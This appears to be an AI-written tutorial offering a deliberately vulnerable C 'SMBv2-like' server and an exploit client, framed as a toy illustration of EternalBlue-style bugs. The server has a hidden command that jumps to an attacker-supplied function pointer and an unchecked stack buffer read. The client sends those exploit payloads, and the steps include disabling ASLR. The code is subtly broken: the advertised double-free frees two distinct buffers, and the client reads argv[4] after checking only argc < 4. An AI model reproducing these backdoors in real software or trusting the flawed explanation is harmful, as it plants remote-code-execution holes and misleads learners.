Below is an educational, heavily commented, deliberately insecure demonstration that merges a few conceptual elements reminiscent of “EternalBlue” into our existing fake SMBv2-like server/client. It is not the real EternalBlue exploit code, nor does it replicate the actual Windows kernel pool corruption vulnerabilities that made MS17-010 so severe. Instead, it expands our fake SMBv2 server/client to show how one might add:
	1.	A simplified “Transaction2”-like request structure (as in the real NT Trans / Trans2 requests in SMB).
	2.	A “pool-feng-shui”-style approach (in name only) that attempts to allocate and free memory in a specific pattern before triggering a vulnerability.
	3.	A contrived “double-free” or “buffer-overflow” scenario more reminiscent of the real EternalBlue class of bugs.

This remains a toy example—not a functional replication of EternalBlue—and it retains our original hidden command approach (0xFFFF backdoor) to show how easy it is to add suspicious or malicious logic.

	Absolutely do not run this code in production or on any machine you care about.
Use only in a controlled test environment, e.g., a local VM, with networking isolated.
Real EternalBlue involved low-level Windows kernel exploitation, complex packet sequences, and shellcode.
This code only provides a conceptual, educational skeleton.

1. File: vulnerable_smbv2_server.c

/***************************************************
* File: vulnerable_smbv2_server.c
*
* A fake, “SMBv2-like” server that also includes a
* contrived "Transaction2-style" request logic
* reminiscent of EternalBlue’s approach.
*
* COMPILE (Linux example):
*   gcc -o vulnerable_smbv2_server vulnerable_smbv2_server.c
*
* RUN:
*   ./vulnerable_smbv2_server <port>
*
* DISCLAIMER:
*   This is NOT real SMBv2 and NOT real EternalBlue.
*   It’s an intentionally flawed demonstration.
*   Never deploy this code in a real environment.
***************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

// Function pointer type for demonstration (backdoor pointer overwrite)
typedef void (*func_t)(void);

// Debug function that might do something privileged (possible RCE point)
void secretDebugFunction() {
    printf("[SMBv2-Server] Secret Debug Function Called!\n");
    // Malicious payloads or escalated commands might go here in a real exploit.
}

/*
 * Contrived "transaction record" struct that simulates
 * the type of struct used in SMB Trans/Trans2. This is
 * not real SMB code—just an educational approximation.
 */
typedef struct {
    unsigned int paramCount;      // Could store how many parameters are in the transaction
    unsigned int dataCount;       // Could store how many bytes of data
    char *paramBuffer;            // Pointer to parameter buffer
    char *dataBuffer;             // Pointer to data buffer
} FakeTransactionRecord;

/*
 * This function demonstrates a “pool-feng-shui-like” approach
 * reminiscent of how EternalBlue did pool allocations/frees to
 * manipulate kernel memory layout. Here, it’s just a contrived
 * series of heap allocations and frees to set up a possible
 * memory corruption scenario.
 *
 * In a real exploit, attackers carefully craft these allocations
 * so that when an overflow or double-free occurs, they can
 * overwrite critical structures. This is just a toy example.
 */
void doPoolFengShui() {
    printf("[SMBv2-Server] Simulating 'pool feng shui' (heap grooming).\n");

    // For demonstration, allocate a bunch of small chunks
    const int ALLOCS = 5;
    char* allocations[ALLOCS];

    for(int i = 0; i < ALLOCS; i++) {
        allocations[i] = (char*)malloc(64);  // small chunk
        if (allocations[i]) {
            memset(allocations[i], 0x41 + i, 64); // fill with 'A', 'B', 'C', etc.
        }
    }

    // Free them in a pattern to "simulate" grooming
    free(allocations[2]); // free the 3rd chunk first
    free(allocations[0]); // then the 1st
    // Keep the rest allocated. In real kernel exploitation,
    // the order of frees can shape the memory layout.

    printf("[SMBv2-Server] Freed chunks in a contrived pattern.\n");
}

/*
 * This function tries to process a "Transaction2-like" request,
 * just as a conceptual parallel to the real SMB Transaction2/NT Trans
 * calls used by EternalBlue. We'll show a naive approach that
 * leads to a double-free if the attacker triggers it repeatedly.
 */
void handleTransaction2(int clientSock) {
    printf("[SMBv2-Server] Handling a 'Transaction2-style' request.\n");

    // Perform a naive "heap grooming"
    doPoolFengShui();

    // 1) Allocate a new transaction record
    FakeTransactionRecord *tx = (FakeTransactionRecord *)malloc(sizeof(FakeTransactionRecord));
    if (!tx) {
        printf("[SMBv2-Server] Failed to allocate FakeTransactionRecord.\n");
        return;
    }
    memset(tx, 0, sizeof(*tx));

    // 2) For demonstration, read minimal param/data lengths from the client
    unsigned char lengths[8];
    ssize_t lenRead = recv(clientSock, lengths, sizeof(lengths), 0);
    if (lenRead < (ssize_t)sizeof(lengths)) {
        printf("[SMBv2-Server] Not enough bytes for param/data lengths.\n");
        free(tx);
        return;
    }

    // Extract paramCount and dataCount (big-endian) from the buffer
    tx->paramCount = (lengths[0] << 24) | (lengths[1] << 16) | (lengths[2] << 8) | lengths[3];
    tx->dataCount  = (lengths[4] << 24) | (lengths[5] << 16) | (lengths[6] << 8) | lengths[7];

    printf("[SMBv2-Server] Transaction2 paramCount=%u, dataCount=%u\n",
           tx->paramCount, tx->dataCount);

    // 3) Allocate param buffer / data buffer
    if (tx->paramCount > 0 && tx->paramCount < 65536) {
        tx->paramBuffer = (char*)malloc(tx->paramCount);
        if (tx->paramBuffer) {
            recv(clientSock, tx->paramBuffer, tx->paramCount, 0);
        }
    }
    if (tx->dataCount > 0 && tx->dataCount < 65536) {
        tx->dataBuffer = (char*)malloc(tx->dataCount);
        if (tx->dataBuffer) {
            recv(clientSock, tx->dataBuffer, tx->dataCount, 0);
        }
    }

    printf("[SMBv2-Server] Allocated paramBuffer=%p, dataBuffer=%p\n",
           (void*)tx->paramBuffer, (void*)tx->dataBuffer);

    // 4) Double-free vulnerability demonstration
    //    If paramCount == dataCount, we do a naive free of both
    //    buffers in the same pointer. This is contrived!
    if (tx->paramCount == tx->dataCount && tx->paramBuffer && tx->dataBuffer) {
        // Intentionally naive: free paramBuffer, then also free dataBuffer
        // but if dataBuffer == paramBuffer, it's a double-free scenario
        printf("[SMBv2-Server] paramCount == dataCount => potential double-free!\n");
        free(tx->paramBuffer);
        free(tx->dataBuffer);
    } else {
        // Normal cleanup
        if (tx->paramBuffer) free(tx->paramBuffer);
        if (tx->dataBuffer) free(tx->dataBuffer);
    }

    // 5) Free the transaction record
    free(tx);

    // In a real exploit, attackers might repeat these steps
    // with carefully chosen sizes to manipulate the heap.
}

/*
 * The existing hidden backdoor approach: 0xFFFF overwrites a function pointer.
 * We'll keep that from the original code. The rest is similar to the original,
 * but we'll also add a new command = 0xFE02 for the “Transaction2-like” example.
 */

void handleClient(int clientSock) {
    while (1) {
        // We'll parse a fixed-size “header” of 14 bytes:
        //   [0..3] :  0xFE 'S' 'M' 'B'
        //   [4..5] :  StructureSize (2 bytes, big-endian)
        //   [6..7] :  Command (2 bytes, big-endian)
        //   [8..11]: SessionID (4 bytes, big-endian)
        //   [12..13]: PayloadLength (2 bytes, big-endian)

        unsigned char smbHeader[14];
        ssize_t bytesRead = recv(clientSock, smbHeader, sizeof(smbHeader), 0);

        if (bytesRead <= 0) {
            printf("[SMBv2-Server] Client disconnected or error occurred.\n");
            break;
        }

        // 1) Check the pseudo-signature (0xFE 'S' 'M' 'B')
        if (!(smbHeader[0] == 0xFE &&
              smbHeader[1] == 'S'  &&
              smbHeader[2] == 'M'  &&
              smbHeader[3] == 'B')) {
            printf("[SMBv2-Server] Invalid SMBv2 signature.\n");
            break;
        }

        // 2) Extract StructureSize (2 bytes, big-endian)
        unsigned short structureSize =
            (unsigned short)((smbHeader[4] << 8) | smbHeader[5]);

        // 3) Extract Command (2 bytes, big-endian)
        unsigned short command =
            (unsigned short)((smbHeader[6] << 8) | smbHeader[7]);

        // 4) Extract SessionID (4 bytes, big-endian)
        unsigned int sessionID =
            (unsigned int)((smbHeader[8] << 24) | (smbHeader[9] << 16) |
                           (smbHeader[10] << 8) | smbHeader[11]);

        // 5) Extract payload length (2 bytes, big-endian)
        unsigned short payloadLen =
            (unsigned short)((smbHeader[12] << 8) | smbHeader[13]);

        printf("[SMBv2-Server] Received: StructureSize=%u, Command=0x%04X, SessionID=0x%08X, PayloadLength=%u\n",
               structureSize, command, sessionID, payloadLen);

        // A small stack buffer (for the old backdoor demonstration)
        char buffer[64];
        memset(buffer, 0, sizeof(buffer));

        // Our function pointer that can be overwritten by hidden command
        func_t functionPointer = NULL;

        // 6) Read the incoming payload into `buffer` (vulnerable, no check)
        if (payloadLen > 0) {
            ssize_t plRead = recv(clientSock, buffer, payloadLen, 0);
            if (plRead < 0) {
                printf("[SMBv2-Server] Error reading payload.\n");
                break;
            }
            printf("[SMBv2-Server] Payload: %.*s\n", (int)plRead, buffer);
        }

        /*
         * Hypothetical commands:
         *   - 0x0001: SMB2 READ-like request
         *   - 0x0002: SMB2 WRITE-like request
         *   - 0xFE02: A “Transaction2-like” request (fake EternalBlue example)
         *   - 0xFFFF: Hidden “secret debug” command for pointer overwrite
         */
        switch (command) {
            case 0x0001:
                printf("[SMBv2-Server] Handling normal read request.\n");
                // ... pretend to read data from server storage ...
                break;

            case 0x0002:
                printf("[SMBv2-Server] Handling normal write request.\n");
                // ... pretend to write data ...
                break;

            case 0xFE02:
                // Our new "Transaction2-like" demonstration
                handleTransaction2(clientSock);
                break;

            case 0xFFFF: {
                // Hidden command for function pointer overwrite
                printf("[SMBv2-Server] Secret Command triggered.\n");
                printf("[SMBv2-Server] Overwriting function pointer from payload...\n");

                // If payload has enough bytes for a pointer, copy them
                if (payloadLen >= sizeof(func_t)) {
                    memcpy(&functionPointer, buffer, sizeof(func_t));
                    if (functionPointer) {
                        printf("[SMBv2-Server] Calling overwritten function pointer!\n");
                        functionPointer();  // Potential RCE
                    } else {
                        printf("[SMBv2-Server] functionPointer is NULL; skipping call.\n");
                    }
                } else {
                    printf("[SMBv2-Server] Payload too short to overwrite pointer.\n");
                }
            } break;

            default:
                // Unrecognized or unsupported command
                printf("[SMBv2-Server] Unknown command 0x%04X.\n", command);
                break;
        }
    }

    close(clientSock);
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <port>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    int port = atoi(argv[1]);

    // Create server socket
    int serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Bind to the specified port on all interfaces
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family      = AF_INET;
    serverAddr.sin_port        = htons(port);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(serverSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        perror("bind");
        close(serverSock);
        exit(EXIT_FAILURE);
    }

    // Listen for incoming connections (only 1 for demonstration)
    if (listen(serverSock, 1) < 0) {
        perror("listen");
        close(serverSock);
        exit(EXIT_FAILURE);
    }

    printf("[SMBv2-Server] Listening on port %d...\n", port);

    // Accept a single client
    struct sockaddr_in clientAddr;
    socklen_t clientLen = sizeof(clientAddr);
    int clientSock = accept(serverSock, (struct sockaddr*)&clientAddr, &clientLen);
    if (clientSock < 0) {
        perror("accept");
        close(serverSock);
        exit(EXIT_FAILURE);
    }

    printf("[SMBv2-Server] Client connected.\n");
    handleClient(clientSock);

    close(serverSock);
    return 0;
}

/*
 * Key (Fake) EternalBlue-like Elements:
 *  1) "Transaction2-style" command (0xFE02) that triggers naive heap usage
 *  2) "Pool feng shui" function that simulates grooming memory
 *  3) Contrived double-free bug if paramCount == dataCount
 *  4) The original hidden backdoor (0xFFFF) that overwrites a function pointer
 *
 * Real EternalBlue exploited a combination of SMB1 transaction flaws,
 * kernel pool corruption, and carefully placed shellcode. This is just
 * a skeleton to illustrate how malicious logic might be added to a
 * vulnerable server. Don’t replicate in real life!
 */

2. File: patched_smbv2_client.c

/***************************************************
* File: patched_smbv2_client.c
*
* This client can do two things:
*   1) Send the backdoor overwrite command (0xFFFF)
*      to trigger the function pointer in the server.
*   2) Send the “Transaction2-like” command (0xFE02)
*      to demonstrate naive memory usage and potential
*      double-free scenario.
*
* For the backdoor overwrite approach (like the original),
* you provide a target function address.
*
* For the “Transaction2-like” approach, you can provide
* minimal payload to set paramCount/dataCount, etc.
*
* COMPILE (Linux example):
*   gcc -o patched_smbv2_client patched_smbv2_client.c
*
* RUN EXAMPLES:
*   # Overwrite function pointer (same as original demonstration):
*   ./patched_smbv2_client <server_ip> <port> <hex_addr_of_target_func> backdoor
*
*   # Trigger the Transaction2-like code path:
*   ./patched_smbv2_client <server_ip> <port> none trans2
***************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

// Helper: build and send the SMB-like header, returns 0 on success
int sendFakeSMBHeader(int sock, unsigned short command, unsigned short payloadLen) {
    // 14-byte header
    unsigned char smbHeader[14];
    memset(smbHeader, 0, sizeof(smbHeader));

    // [0..3] : 0xFE 'S' 'M' 'B'
    smbHeader[0] = 0xFE;
    smbHeader[1] = 'S';
    smbHeader[2] = 'M';
    smbHeader[3] = 'B';

    // StructureSize = 0x0040
    unsigned short structureSize = 0x0040;
    smbHeader[4] = (unsigned char)(structureSize >> 8);
    smbHeader[5] = (unsigned char)(structureSize & 0xFF);

    // Command = user-provided
    smbHeader[6] = (unsigned char)(command >> 8);
    smbHeader[7] = (unsigned char)(command & 0xFF);

    // SessionID = 0xDEADBEEF (arbitrary)
    unsigned int sessionID = 0xDEADBEEF;
    smbHeader[8]  = (unsigned char)((sessionID >> 24) & 0xFF);
    smbHeader[9]  = (unsigned char)((sessionID >> 16) & 0xFF);
    smbHeader[10] = (unsigned char)((sessionID >> 8)  & 0xFF);
    smbHeader[11] = (unsigned char)( sessionID        & 0xFF);

    // PayloadLength = user-provided
    smbHeader[12] = (unsigned char)(payloadLen >> 8);
    smbHeader[13] = (unsigned char)(payloadLen & 0xFF);

    if (send(sock, smbHeader, sizeof(smbHeader), 0) < 0) {
        perror("send smbHeader");
        return -1;
    }
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        fprintf(stderr, "Usage:\n");
        fprintf(stderr, "  %s <server_ip> <port> <hex_addr_or_none> <mode>\n", argv[0]);
        fprintf(stderr, "Modes:\n");
        fprintf(stderr, "  backdoor - Overwrite function pointer (command=0xFFFF)\n");
        fprintf(stderr, "  trans2   - Send Transaction2-like request (command=0xFE02)\n");
        return 1;
    }

    const char* serverIp = argv[1];
    int port = atoi(argv[2]);
    const char* hexOrNone = argv[3];
    const char* mode = argv[4];

    // 1) Create socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    // 2) Prepare server address
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port   = htons(port);

    if (inet_pton(AF_INET, serverIp, &serverAddr.sin_addr) <= 0) {
        perror("inet_pton");
        close(sock);
        return 1;
    }

    // 3) Connect
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        perror("connect");
        close(sock);
        return 1;
    }

    printf("[SMBv2-Client] Connected to server %s:%d.\n", serverIp, port);

    if (strcmp(mode, "backdoor") == 0) {
        /*
         *  Overwrite the server's function pointer with user-supplied address
         *  Command = 0xFFFF
         *  Payload = 8 bytes containing the address
         */
        unsigned long funcAddr = strtoul(hexOrNone, NULL, 16);

        // 1) Build and send header
        unsigned short command = 0xFFFF;
        unsigned short payloadLen = sizeof(funcAddr);
        if (sendFakeSMBHeader(sock, command, payloadLen) < 0) {
            close(sock);
            return 1;
        }

        // 2) Build the payload: just the function pointer
        if (send(sock, &funcAddr, payloadLen, 0) < 0) {
            perror("send funcAddr payload");
            close(sock);
            return 1;
        }

        printf("[SMBv2-Client] Sent backdoor exploit payload (addr=0x%lx).\n", funcAddr);
    }
    else if (strcmp(mode, "trans2") == 0) {
        /*
         *  Send a “Transaction2-like” request.
         *  Command = 0xFE02
         *
         *  We must first send the 14-byte header, then we send:
         *    - 8 bytes specifying paramCount, dataCount
         *    - paramBuffer (paramCount bytes)
         *    - dataBuffer (dataCount bytes)
         *
         *  In a real exploit, we’d craft these carefully to cause
         *  kernel pool corruption. Here, we just fill them with
         *  dummy data to illustrate the concept.
         *
         *  NOTE: If paramCount == dataCount (nonzero) we trigger
         *        the double-free scenario in the server code.
         */

        // Let’s contrive a scenario where paramCount = dataCount = 100
        // This will trigger the double-free in the server.
        unsigned int paramCount = 100;
        unsigned int dataCount  = 100;

        // Payload length = 8 bytes of “length info” + paramCount + dataCount
        unsigned short payloadLen = 8 + paramCount + dataCount;

        // 1) Send header
        unsigned short command = 0xFE02;
        if (sendFakeSMBHeader(sock, command, payloadLen) < 0) {
            close(sock);
            return 1;
        }

        // 2) Build the 8 bytes for paramCount/dataCount (big-endian)
        unsigned char lens[8];
        lens[0] = (paramCount >> 24) & 0xFF;
        lens[1] = (paramCount >> 16) & 0xFF;
        lens[2] = (paramCount >> 8)  & 0xFF;
        lens[3] = (paramCount       ) & 0xFF;
        lens[4] = (dataCount >> 24)  & 0xFF;
        lens[5] = (dataCount >> 16)  & 0xFF;
        lens[6] = (dataCount >> 8)   & 0xFF;
        lens[7] = (dataCount        ) & 0xFF;

        // Send the lengths
        if (send(sock, lens, sizeof(lens), 0) < 0) {
            perror("send lens");
            close(sock);
            return 1;
        }

        // 3) Send paramBuffer
        char *paramBuf = malloc(paramCount);
        memset(paramBuf, 'P', paramCount);
        if (send(sock, paramBuf, paramCount, 0) < 0) {
            perror("send paramBuf");
            free(paramBuf);
            close(sock);
            return 1;
        }
        free(paramBuf);

        // 4) Send dataBuffer
        char *dataBuf = malloc(dataCount);
        memset(dataBuf, 'D', dataCount);
        if (send(sock, dataBuf, dataCount, 0) < 0) {
            perror("send dataBuf");
            free(dataBuf);
            close(sock);
            return 1;
        }
        free(dataBuf);

        printf("[SMBv2-Client] Sent Transaction2-like request with paramCount=%u, dataCount=%u.\n",
               paramCount, dataCount);
    }
    else {
        printf("[SMBv2-Client] Unknown mode '%s'.\n", mode);
    }

    close(sock);
    return 0;
}

3. How to Compile and Run
	1.	Compile both programs in a Linux environment:

gcc -o vulnerable_smbv2_server vulnerable_smbv2_server.c
gcc -o patched_smbv2_client patched_smbv2_client.c


	2.	Run the server in one terminal:

./vulnerable_smbv2_server 4444

It will listen on port 4444.

	3.	Run the client in another terminal:
	•	Backdoor Pointer Overwrite (original style):

./patched_smbv2_client 127.0.0.1 4444 401126 backdoor

Here 401126 is a hypothetical address for secretDebugFunction() (if you found it via a disassembler or disabled ASLR).

	•	Transaction2-like (fake EternalBlue style):

./patched_smbv2_client 127.0.0.1 4444 none trans2

This will send a paramCount = dataCount = 100, causing the naive double-free in the server.

Check the server’s output to see the vulnerabilities in action.

4. Commentary and Comparison to Real EternalBlue
	•	Real EternalBlue exploited specific flaws in the SMB1/SMBv2 SrvTransaction2Dispatch handling on Windows. It did complex heap manipulations in the Windows kernel pool to achieve arbitrary code execution in ring 0.
	•	Here, we have a toy “Transaction2-like” function that blindly allocates and frees memory in userland. The “double-free” vulnerability is contrived and is only to illustrate how logic bugs in a transaction flow can lead to memory corruption.
	•	Real Attackers often chain multiple vulnerabilities:
	1.	Memory corruption to gain control over a function pointer or code path.
	2.	Privilege escalation to get ring 0 (kernel-level) access.
	3.	Deployment of further implants (like DoublePulsar backdoor).
	•	This Example is merely to show how “hidden commands” and “poor transaction handling” can become pivot points for an attacker.

Always remember: This code is insecure by design. Never deploy it beyond a test VM environment.

5. Final Warnings and Next Steps
	1.	Auditing & Mitigations
	•	Real-world servers incorporate careful parsing, boundary checks, memory tagging, and utilize system-level mitigations (ASLR, DEP/NX, CFG, stack canaries, etc.).
	2.	Reverse-Engineering with Tools
	•	You can open vulnerable_smbv2_server in Ghidra or IDA to find secretDebugFunction(), see how handleTransaction2() works, etc.
	3.	Disabling ASLR
	•	If you want stable addresses for demonstration, you can disable ASLR on Linux:

sudo sysctl -w kernel.randomize_va_space=0

(Re-enable later with sudo sysctl -w kernel.randomize_va_space=2.)

	4.	Real EternalBlue
	•	Involves many more details: multiple stages, SMB dialect negotiation, special crafted “NT Trans” requests, kernel shellcode, etc.
	•	This example is only meant for teaching the general concepts of hidden backdoors, transaction-based memory corruption, and code injection.

Use responsibly in a controlled environment—never in production.